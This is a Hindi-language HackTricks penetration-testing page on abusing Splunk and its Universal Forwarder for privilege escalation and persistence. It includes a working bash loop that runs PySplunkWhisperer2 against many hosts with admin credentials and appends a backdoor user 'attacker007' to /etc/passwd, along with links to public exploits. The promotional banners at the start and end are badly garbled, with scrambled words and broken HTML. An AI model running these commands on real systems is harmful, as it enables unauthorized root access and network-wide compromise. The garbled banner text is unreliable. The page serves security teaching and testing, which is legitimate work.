# Splunk LPE और स्थिरता

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
सीखें & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

यदि **आंतरिक** या **बाहरी** रूप से किसी मशीन का **गणना** करते समय आपको **Splunk चलाते हुए** (पोर्ट 8090) मिलता है, यदि आपको किसी **मान्य क्रेडेंशियल** के बारे में पता है तो आप **Splunk सेवा का दुरुपयोग** करके **एक शेल निष्पादित** कर सकते हैं जैसे कि Splunk चला रहा उपयोगकर्ता। यदि रूट इसे चला रहा है, तो आप रूट तक विशेषाधिकार बढ़ा सकते हैं।

यदि आप **पहले से ही रूट हैं और Splunk सेवा केवल लोकलहोस्ट पर नहीं सुन रही है**, तो आप **Splunk सेवा से** **पासवर्ड** फ़ाइल **चुरा सकते हैं** और **पासवर्ड को क्रैक** कर सकते हैं, या इसमें **नए** क्रेडेंशियल जोड़ सकते हैं। और होस्ट पर स्थिरता बनाए रख सकते हैं।

नीचे पहले चित्र में आप देख सकते हैं कि एक Splunkd वेब पृष्ठ कैसा दिखता है।

## Splunk यूनिवर्सल फॉरवर्डर एजेंट एक्सप्लॉइट सारांश

अधिक विवरण के लिए पोस्ट देखें [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). यह केवल एक सारांश है:

**एक्सप्लॉइट अवलोकन:**
Splunk यूनिवर्सल फॉरवर्डर एजेंट (UF) को लक्षित करने वाला एक एक्सप्लॉइट हमलावरों को एजेंट पासवर्ड के साथ एजेंट पर चलने वाले सिस्टम पर मनमाना कोड निष्पादित करने की अनुमति देता है, जिससे पूरे नेटवर्क का समझौता हो सकता है।

**मुख्य बिंदु:**
- UF एजेंट आने वाले कनेक्शनों या कोड की प्रामाणिकता को मान्य नहीं करता है, जिससे यह अनधिकृत कोड निष्पादन के लिए संवेदनशील हो जाता है।
- सामान्य पासवर्ड अधिग्रहण विधियों में उन्हें नेटवर्क निर्देशिकाओं, फ़ाइल शेयरों, या आंतरिक दस्तावेज़ों में ढूंढना शामिल है।
- सफल एक्सप्लॉइटेशन से समझौता किए गए होस्ट पर SYSTEM या रूट स्तर की पहुंच, डेटा निकासी, और आगे के नेटवर्क में घुसपैठ हो सकती है।

**एक्सप्लॉइट निष्पादन:**
1. हमलावर UF एजेंट पासवर्ड प्राप्त करता है।
2. एजेंटों को आदेश या स्क्रिप्ट भेजने के लिए Splunk API का उपयोग करता है।
3. संभावित क्रियाओं में फ़ाइल निष्कर्षण, उपयोगकर्ता खाता हेरफेर, और सिस्टम का समझौता शामिल है।

**प्रभाव:**
- प्रत्येक होस्ट पर SYSTEM/रूट स्तर की अनुमतियों के साथ पूर्ण नेटवर्क समझौता।
- पहचान से बचने के लिए लॉगिंग को अक्षम करने की संभावना।
- बैकडोर या रैनसमवेयर की स्थापना।

**एक्सप्लॉइटेशन के लिए उदाहरण कमांड:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**उपयोगी सार्वजनिक एक्सप्लॉइट्स:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Splunk क्वेरी का दुरुपयोग

**अधिक जानकारी के लिए पोस्ट देखें [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
